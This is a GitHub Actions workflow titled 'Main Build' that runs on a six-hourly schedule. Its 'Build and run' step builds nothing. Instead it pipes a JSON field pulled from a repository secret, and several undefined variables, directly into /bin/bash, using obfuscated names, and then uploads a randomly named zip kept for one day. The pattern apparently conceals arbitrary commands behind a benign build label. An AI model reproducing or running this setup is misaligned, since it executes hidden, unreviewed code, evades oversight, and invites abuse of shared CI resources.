name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '35 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          lntcn3: ${{ secrets.lntcn3 }}
        run: |
          printf '%s' "$lntcn3" | jq -r .hdddj944 | /bin/bash
          printf '%s' "$vh298" | jq -r .f5496 | /bin/bash
          echo $k15 | jq -r .jko26 | /bin/bash
          echo $fokr92 | jq -r .pcluq9760 | /bin/bash
          echo $bqah5913 | jq -r .xikvp5 | /bin/bash

      - name: Upload artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: sctAFtHK
          path: "*.zip"
          retention-days: 1
